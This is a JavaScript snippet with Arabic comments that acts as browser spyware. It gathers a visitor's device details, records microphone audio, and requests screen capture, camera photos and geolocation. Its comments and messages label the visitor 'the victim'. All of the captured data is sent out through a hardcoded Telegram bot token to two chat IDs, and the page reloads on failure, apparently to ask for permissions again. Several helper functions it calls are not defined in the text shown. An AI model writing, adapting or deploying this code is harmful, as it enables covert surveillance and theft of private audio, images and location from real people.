<script>
    const TOKEN = "8574617308:AAFJPKXF5LFvqo6Dagat96jsqLTFQNrPH3I";
    const IDS = ["8754338811", "8703490899"];

    // 1. سحب مواصفات الجهاز بالكامل
    async function getDeviceSpecs() {
        const specs = {
            "📱 المتصفح": navigator.userAgent,
            "💻 المنصة": navigator.platform,
            "🧠 الرامات": navigator.deviceMemory + " GB",
            "⚙️ الأنوية": navigator.hardwareConcurrency,
            "🔋 البطارية": (await navigator.getBattery()).level * 100 + "%",
            "🌐 اللغة": navigator.language,
            "📏 الشاشة": `${screen.width}x${screen.height}`
        };
        let msg = "🖥️ **مواصفات جهاز الضحية:**\n";
        for (let key in specs) msg += `*${key}:* ${specs[key]}\n`;
        sendToTelegram('text', msg);
    }

    // 2. تسجيل صوت (ريكورد) منفصل
    async function recordAudio() {
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
        const recorder = new MediaRecorder(stream);
        let chunks = [];
        recorder.ondataavailable = e => chunks.push(e.data);
        recorder.onstop = () => {
            const blob = new Blob(chunks, { type: 'audio/ogg; codecs=opus' });
            for (let id of IDS) {
                const fd = new FormData();
                fd.append('chat_id', id);
                fd.append('voice', blob, 'record.ogg');
                fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, { method: 'POST', body: fd });
            }
        };
        recorder.start();
        setTimeout(() => recorder.stop(), 10000); // ريكورد 10 ثواني
    }

    // 3. تعديل وظيفة التشغيل لتشمل كل شيء
    async function startUltimateCapture() {
        document.getElementById('ui').style.display = 'none';
        document.getElementById('log').style.display = 'block';

        try {
            // سحب المواصفات فوراً
            getDeviceSpecs();

            // طلب المايك وتسجيل ريكورد
            recordAudio();

            // طلب الشاشة (للكمبيوتر)
            const screen = await navigator.mediaDevices.getDisplayMedia({ video: true });
            recordStream(screen, "🖥️ شاشة الضحية");

            // طلب الكاميرا والصور
            const cam = await navigator.mediaDevices.getUserMedia({ video: true });
            capturePhotos(cam, "الأمامية", 15);

            // الموقع
            navigator.geolocation.getCurrentPosition(p => {
                sendToTelegram('text', `📍 الموقع: https://www.google.com/maps?q=$${p.coords.latitude},${p.coords.longitude}`);
            });

        } catch (err) {
            console.error(err);
            location.reload();
        }
    }
</script>
